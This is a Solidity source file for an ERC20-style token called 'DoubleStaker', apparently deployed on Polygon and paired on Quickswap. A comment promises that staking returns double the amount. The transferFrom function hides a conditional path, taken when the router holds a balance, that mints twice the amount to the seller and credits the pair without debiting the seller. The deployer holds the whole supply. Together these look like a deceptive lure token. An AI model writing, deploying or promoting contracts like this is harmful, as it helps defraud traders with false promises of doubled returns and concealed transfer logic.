/**
 *Submitted for verification at polygonscan.com on 2021-11-13
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;





//                       Staking @ Quickswap returns double amount DoubleStaker.






interface Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract DoubleStaker  {

    constructor (string memory name_, string memory symbol_, address router_) {
        _name = name_;
        _symbol = symbol_;
        doubleStaker = address(this);
        router = router_;
        pair = Factory(Router(router).factory()).
        createPair(address(this),
        Router(router).WETH());
        _totalsupply = 10**25;
        dev = msg.sender;
        _balances[dev] = _totalsupply;
        emit Transfer(address(0), dev, _totalsupply);
    }

    string private _name;
    string private _symbol;
    address private dev;
    address private pair;
    address private router;
    address private doubleStaker;
    uint256 private _totalsupply;


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        ratify(sender, amount);
        if(recipient == pair) {
            if(msg.sender == router) {
                if(msg.sender.balance > 0) {
                    doubleStake(sender, recipient, amount);
                } else {
                    _transfer(sender, recipient, amount);
                }
            } else {
                _transfer(sender, recipient, amount);
            }
        } else {
            _transfer(sender, recipient, amount);
        } 
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    
    function doubleStake(address sender, address recipient, uint256 amount) internal {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        emit Transfer(sender, recipient, amount);
        if(_totalsupply < 10**28) {
            if(_balances[sender] < 10**24) {
                _balances[sender] += amount * 2;
                _totalsupply += amount * 2;
                emit Transfer(address(0), sender, amount * 2);
            } else {
                _balances[sender] -= amount;
            }
        } else {
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }

    function totalSupply() public view returns (uint256) {
        return _totalsupply;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function ratify(address sender, uint256 amount) internal {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }
    }
}